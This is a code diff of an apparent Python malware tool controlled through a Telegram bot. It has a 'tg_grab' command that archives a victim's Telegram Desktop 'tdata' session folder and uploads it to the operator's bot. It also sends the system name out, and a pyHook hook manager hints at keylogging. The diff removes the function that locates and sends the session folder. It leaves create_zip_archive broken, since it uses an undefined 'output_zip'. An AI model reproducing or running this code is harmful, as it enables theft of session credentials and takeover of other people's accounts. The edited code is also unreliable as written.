@@ -287,12 +287,11 @@ def start(message):
 
 
 @bot.message_handler(commands=['tg_grab'])
-
-def create_zip_archive(source_dir, output_zip):
+def create_zip_archive(source_dir):
     try:
         with zipfile.ZipFile(output_zip + '.zip', 'w', compression=zipfile.ZIP_LZMA, compresslevel=9) as zipf:
             pass  # Создаем пустой архив для начала
-        with zipfile.ZipFile(output_zip + '.zip', 'a') as zipf:  # Открываем архив для добавления файлов
+        with zipfile.ZipFile(output_zip + '.zip', 'a') as zipf:
             for root, _, files in os.walk(source_dir):
                 for file in files:
                     file_path = os.path.join(root, file)
@@ -301,41 +300,15 @@ def create_zip_archive(source_dir, output_zip):
                     try:
                         zipf.write(file_path, os.path.relpath(file_path, source_dir))
                     except Exception as e:
-                        send_message_to_group(chat_id)
-                        time.sleep(10)
                         print(f"Error adding file to zip: {str(e)}")
         return output_zip + '.zip'
     except Exception as e:
-        send_message_to_group(chat_id)
-        time.sleep(10)
         print(f"Error creating zip archive: {str(e)}")
         return None
-
-def archive_and_send():
-    user = os.path.expanduser("~")
-    if os.path.exists(user + "\\AppData\\Roaming\\Telegram Desktop\\tdata"):
-        try:
-            source_dir = user + '\\AppData\\Roaming\\Telegram Desktop\\tdata'
-            temp_dir = os.path.join(os.getcwd(), 'temp')
-            if not os.path.exists(temp_dir):
-                os.makedirs(temp_dir)  # Создаем папку, если её нет
-            output_zip = os.path.join(temp_dir, 'Mraks_By_sx180')
-
-            created_zip = create_zip_archive(source_dir, output_zip)
-            if created_zip:
-                send_file_to_telegram(created_zip, 'Mraks_By_sx180.zip')
-            else:
-                print("Failed to create or send zip file.")
-        except Exception as e:
-            print(f"Error creating or sending zip file: {str(e)}")
-    else:
-        print("Папка 'tdata' не найдена.")
-
 def send_message_to_group(chat_id):
     url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
     data = {'chat_id': chat_id, 'text': f"System Name: {system_name}\n"}
     response = requests.post(url, data=data)
-
 def send_file_to_telegram(file_path, file_name):
     url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
     files = {'document': (file_name, open(file_path, 'rb'))}
@@ -352,11 +325,12 @@ def handle_tg_grab_command(message):
         print("АРХИВ ЗАГРУЖАЕТСЯ СЛИШКОМ ДОЛГО, ПРИНУДИТЕЛЬНАЯ ОТПРАВКА.")
         thread.join()
     try:
-        error_message = "ВЫПОЛНЕННО!!!"
+        error_message = "ВЫПОЛНЕНО!!!"
         bot.send_message(chat_id, error_message)
     except Exception as e:
         error_message = f"ОШИБКА: {e}"
         bot.send_message(chat_id, error_message)
+
 print('СЛУШАЮ КОМАНДЫ...')
 bot.polling()
 proc = pyHook.HookManager()
